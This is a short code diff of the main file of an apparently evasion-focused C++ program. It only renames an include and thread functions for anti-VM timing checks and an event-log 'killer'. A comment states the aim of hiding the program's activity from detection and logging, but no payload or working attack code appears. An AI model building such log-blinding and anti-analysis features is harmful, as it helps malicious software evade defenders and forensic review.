@@ -17,7 +17,7 @@
 #include <modules/file.hpp>
 #include <modules/anti-vm.hpp>
 #include <modules/anti-debug.hpp>
-#include <modules/killeventlog.hpp>
+#include <modules/eventlogkiller.hpp>
 
 int main(int argc, char **argv)
 {
@@ -46,7 +46,7 @@ int main(int argc, char **argv)
 #endif
 
 #ifdef _CPUID_ANALYSIS_ENABLED
-    std::thread cpuidAnalysisThread(sidt);
+    std::thread cpuidAnalysisThread(rdtsc_cpuid_check);
     cpuidAnalysisThread.join();
 #endif
 
@@ -67,7 +67,7 @@ int main(int argc, char **argv)
 
 // Disables certain services / functions to prevent the detection or collection of the activities of the program
 #ifdef _EVENTLOG_BLIND_ENABLED
-    std::thread eventlogBlindThread(logkiller);
+    std::thread eventlogBlindThread(eventlogkiller);
 #endif
 
 
